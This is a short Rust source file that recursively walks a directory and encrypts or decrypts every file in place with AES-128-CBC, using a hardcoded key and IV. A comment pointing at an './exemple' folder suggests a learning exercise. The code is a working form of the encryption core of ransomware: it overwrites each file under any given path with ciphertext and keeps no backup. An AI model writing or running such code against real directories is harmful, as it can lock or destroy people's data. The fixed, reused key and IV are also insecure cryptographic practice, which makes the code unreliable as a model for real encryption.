use std::fs;
use libaes::Cipher; 

pub fn encryption(dir: &str, decrypt: bool){
    // read all file in the directory "./exemple" recursively
    let paths = fs::read_dir(dir).unwrap();

    // show the list of files
    for path in paths {
        // if the file is not a directory
        if path.as_ref().unwrap().path().is_file() {
            // show the file name then encrypt the file
            //println!("{}", path.unwrap().path().display());

            if decrypt {
                decrypt_file(path.unwrap().path().display().to_string().as_str());
            } else {
                encrypt_file(path.unwrap().path().display().to_string().as_str());
            }

        } else {
            // if the file is a directory, go to the directory
            encryption(path.unwrap().path().display().to_string().as_str(), decrypt);
        }
    }
}

fn encrypt_file(file_name: &str) {

    let key = b"alicealicealicea";
    let iv = b"bobbobbobbobbobb";
    let cipher = Cipher::new_128(key);

    // read the file
    let encrypted_string = cipher.cbc_encrypt(iv, &fs::read(file_name).unwrap());

    fs::write(file_name, encrypted_string).unwrap();
}


fn decrypt_file(file_name: &str) {

    let key = b"alicealicealicea";
    let iv = b"bobbobbobbobbobb";
    let cipher = Cipher::new_128(key);

    // read the file
    let decrypted_string = cipher.cbc_decrypt(iv, &fs::read(file_name).unwrap());

    fs::write(file_name, decrypted_string).unwrap();
}